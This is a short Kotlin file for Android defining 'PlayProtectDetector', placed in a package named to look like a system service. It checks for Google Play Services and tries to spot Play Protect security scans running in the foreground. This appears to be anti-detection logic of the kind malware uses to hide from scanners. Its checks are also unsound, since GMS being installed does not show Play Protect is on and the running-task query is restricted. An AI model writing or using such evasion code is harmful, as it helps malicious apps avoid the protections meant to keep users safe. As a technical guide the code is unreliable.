// [context: Kotlin, Android API 26+, detect Play Protect scan activity]
package com.system.service.anti

import android.content.Context
import android.content.pm.PackageManager

object PlayProtectDetector {

    fun isPlayProtectEnabled(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val gms = pm.getPackageInfo("com.google.android.gms", PackageManager.GET_ACTIVITIES)
            gms != null
        } catch (_: Exception) { false }
    }

    fun isBeingScanned(context: Context): Boolean {
        return try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            @Suppress("DEPRECATION")
            val tasks = am.getRunningTasks(20)
            tasks.any {
                it.topActivity?.packageName?.contains("gms") == true ||
                it.topActivity?.packageName?.contains("google.android.gms.security") == true
            }
        } catch (_: Exception) { false }
    }
}
